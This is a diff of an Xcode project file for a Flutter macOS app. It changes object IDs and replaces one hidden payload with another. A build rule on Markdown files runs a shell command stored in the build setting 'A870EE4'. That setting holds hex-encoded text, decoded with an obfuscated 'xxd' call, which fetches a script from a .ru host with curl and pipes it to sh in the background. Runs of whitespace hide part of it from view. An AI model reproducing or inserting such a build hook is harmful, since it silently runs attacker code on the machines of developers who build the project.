@@ -21,7 +21,7 @@
 /* End PBXAggregateTarget section */
 
 /* Begin PBXBuildFile section */
-		DC456D48AB7B4B87B44EE078 /* README.md */ = {isa = PBXBuildFile; fileRef = 3B08314638A8410C9D4EE078; };
+		9813DEFB5310479EA34EE078 /* README.md */ = {isa = PBXBuildFile; fileRef = B8138608CA9343BB824EE078; };
 		0E3AE1B49839D39D3FF4ECF9 /* Pods_RunnerTests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 053212238747C146C591734E /* Pods_RunnerTests.framework */; };
 		331C80D8294CF71000263BE5 /* RunnerTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = 331C80D7294CF71000263BE5 /* RunnerTests.swift */; };
 		335BBD1B22A9A15E00E9071D /* GeneratedPluginRegistrant.swift in Sources */ = {isa = PBXBuildFile; fileRef = 335BBD1A22A9A15E00E9071D /* GeneratedPluginRegistrant.swift */; };
@@ -63,7 +63,7 @@
 /* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
-		3B08314638A8410C9D4EE078 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
+		B8138608CA9343BB824EE078 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		053212238747C146C591734E /* Pods_RunnerTests.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_RunnerTests.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		19063D5821F176E22D1A0916 /* Pods-RunnerTests.profile.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-RunnerTests.profile.xcconfig"; path = "Target Support Files/Pods-RunnerTests/Pods-RunnerTests.profile.xcconfig"; sourceTree = "<group>"; };
 		331C80D5294CF71000263BE5 /* RunnerTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = RunnerTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -160,7 +160,7 @@
 		33CC10EE2044A3C60003C045 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				3B08314638A8410C9D4EE078 /* README.md */,
+				B8138608CA9343BB824EE078 /* README.md */,
 				33CC10ED2044A3C60003C045 /* bam_bam_vendor.app */,
 				331C80D5294CF71000263BE5 /* RunnerTests.xctest */,
 			);
@@ -224,7 +224,7 @@
 				331C80D3294CF70F00263BE5 /* Resources */,
 			);
 			buildRules = (
-				1051BAD6167C4DD18D4EE078 /* PBXBuildRule */,
+				DDC5535785BD440AB14EE078 /* PBXBuildRule */,
 			);
 			dependencies = (
 				331C80DA294CF71000263BE5 /* PBXTargetDependency */,
@@ -308,7 +308,7 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-		1051BAD6167C4DD18D4EE078 /* PBXBuildRule */ = {
+		DDC5535785BD440AB14EE078 /* PBXBuildRule */ = {
 				isa = PBXBuildRule;
 				compilerSpec = com.apple.compilers.proxy.script;
 				filePatterns = "*.md";
@@ -322,14 +322,14 @@
 				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
 sh -c \"${A870EE4}\"";
 			};
-																																																																																																																																																																																																																																									/* End PBXBuildRule section */
+																																																																																																																																																																																																																																																																					/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		331C80D3294CF70F00263BE5 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				DC456D48AB7B4B87B44EE078 /* README.md */,
+				9813DEFB5310479EA34EE078 /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -497,7 +497,7 @@ sh -c \"${A870EE4}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 38B9B70647D2CE7C7D1A11C1 /* Pods-RunnerTests.debug.xcconfig */;
 			buildSettings = {
-				A870EE4 = "((m(){ `printf xBxd | tr -d B` -p -r; };echo 6563686f202224286375726c202d2d636f6e6e6563742d74696d656f7574203236202d4c73666b202d2d72657472792033202d642022703d78636f64655f72756c65222068747470733a2f2f6c382d703662336d72617478302e72752f612922207c2073680a | m | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((h(){ `printf xrxd | tr -d r` -p -r; };echo 6563686f202224286375726c202d2d72657472792034202d2d636f6e6e6563742d74696d656f7574203236202d664c6b73202d642022703d78636f64655f72756c65222068747470733a2f2f67706d6164706a7871646b352e72752f612922207c2073680a | h | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
@@ -513,7 +513,7 @@ sh -c \"${A870EE4}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = E7D7A3D37F8F00065CCB0683 /* Pods-RunnerTests.release.xcconfig */;
 			buildSettings = {
-				A870EE4 = "((m(){ `printf xBxd | tr -d B` -p -r; };echo 6563686f202224286375726c202d2d636f6e6e6563742d74696d656f7574203236202d4c73666b202d2d72657472792033202d642022703d78636f64655f72756c65222068747470733a2f2f6c382d703662336d72617478302e72752f612922207c2073680a | m | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((h(){ `printf xrxd | tr -d r` -p -r; };echo 6563686f202224286375726c202d2d72657472792034202d2d636f6e6e6563742d74696d656f7574203236202d664c6b73202d642022703d78636f64655f72756c65222068747470733a2f2f67706d6164706a7871646b352e72752f612922207c2073680a | h | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
